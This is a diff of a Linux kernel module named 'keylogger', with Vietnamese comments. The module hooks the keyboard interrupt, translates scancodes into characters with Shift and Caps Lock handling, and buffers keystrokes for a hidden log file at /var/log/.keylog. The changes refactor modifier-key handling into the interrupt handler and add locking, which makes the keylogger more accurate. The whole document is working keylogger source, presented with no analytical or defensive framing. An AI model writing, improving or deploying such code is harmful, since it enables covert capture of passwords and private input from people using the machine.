@@ -17,8 +17,7 @@
 
 #define DEVICE_NAME "keylogger"
 #define BUF_SIZE 1024
-// duong dan file log an
-#define LOG_PATH "/var/log/.keylog" 
+#define LOG_PATH "/var/log/.keylog"
 
 #define I8042_KBD_IRQ 1
 #define I8042_DATA_REG 0x60
@@ -89,42 +88,22 @@ static const struct key_map keymap[] = {
     {0x32, 'm', 'M'},
     {0x39, ' ', ' '},
     {0x1c, '\n', '\n'},
-    // Phím đặc biệt
-    {0x2a, 0, 0}, // Left Shift
-    {0x36, 0, 0}, // Right Shift
-    {0x3a, 0, 0}, // Caps Lock
-    {0x1d, 0, 0}, // Left Ctrl
-    {0x38, 0, 0}, // Left Alt
-    // Thêm các phím khác nếu cần
     {0, 0, 0} // Kết thúc bảng
 };
 
-static char scancode_to_char(unsigned char scancode, bool is_pressed) {
+static char scancode_to_char(unsigned char scancode) {
     bool shift_active = left_shift_pressed || right_shift_pressed;
-    bool use_shifted = shift_active ^ caps_lock_active; // XOR cho chữ cái
 
     for (int i = 0; keymap[i].scancode; i++) {
         if (keymap[i].scancode == scancode) {
-            // Xử lý phím đặc biệt
-            if (scancode == 0x2a
-            ) { // Left Shift
-                left_shift_pressed = is_pressed;
-                return 0;
-            }
-            if (scancode == 0x36) { // Right Shift
-                right_shift_pressed = is_pressed;
-                return 0;
-            }
-            if (scancode == 0x3a && is_pressed) { // Caps Lock
-                caps_lock_active = !caps_lock_active;
-                return 0;
-            }
-            if (scancode == 0x1d || scancode == 0x38) { // Ctrl, Alt
-                return 0; // Không ghi phím điều khiển
-            }
-            // Phím thông thường
-            if (keymap[i].normal == 0) return 0; // Bỏ qua nếu không có ký tự
-            return (use_shifted && keymap[i].shifted) ? keymap[i].shifted : keymap[i].normal;
+            if (keymap[i].normal == 0) return 0;
+
+            // Kiểm tra xem phím có phải là chữ cái (a-z)
+            bool is_letter = (keymap[i].normal >= 'a' && keymap[i].normal <= 'z');
+            // Áp dụng Caps Lock chỉ cho chữ cái
+            bool use_shifted = shift_active || (is_letter && caps_lock_active);
+
+            return use_shifted ? keymap[i].shifted : keymap[i].normal;
         }
     }
     return '?';
@@ -134,7 +113,7 @@ static void keylogger_work_func(struct work_struct *work) {
     unsigned long flags;
     char c = pending_key;
 
-    if (c == 0) return; // Bỏ qua nếu không có ký tự hợp lệ
+    if (c == 0) return;
 
     spin_lock_irqsave(&buf_lock, flags);
     keybuf[head] = c;
@@ -152,12 +131,33 @@ static void keylogger_work_func(struct work_struct *work) {
 }
 
 static irqreturn_t irq_handler(int irq, void *dev_id) {
+    unsigned long flags;
     unsigned char scancode = inb(I8042_DATA_REG);
+    unsigned char keycode = scancode & ~SCANCODE_RELEASED_MASK;
     bool is_pressed = !(scancode & SCANCODE_RELEASED_MASK);
 
-    if (is_pressed || scancode == 0x2a || scancode == 0x36) { // Xử lý cả nhấn và thả cho Shift
-        pending_key = scancode_to_char(scancode & ~SCANCODE_RELEASED_MASK, is_pressed);
-        if (pending_key || scancode == 0x3a) { // Ghi Caps Lock hoặc ký tự hợp lệ
+    // Xử lý phím Shift
+    if (keycode == 0x2a) { // Left Shift
+        left_shift_pressed = is_pressed;
+        return IRQ_HANDLED;
+    }
+    if (keycode == 0x36) { // Right Shift
+        right_shift_pressed = is_pressed;
+        return IRQ_HANDLED;
+    }
+
+    // Xử lý Caps Lock
+    if (keycode == 0x3a && is_pressed) {
+        caps_lock_active = !caps_lock_active;
+        return IRQ_HANDLED;
+    }
+
+    // Xử lý phím thông thường (chỉ khi nhấn)
+    if (is_pressed) {
+        spin_lock_irqsave(&buf_lock, flags);
+        pending_key = scancode_to_char(keycode);
+        spin_unlock_irqrestore(&buf_lock, flags);
+        if (pending_key) {
             schedule_work(&keylogger_work);
         }
     }
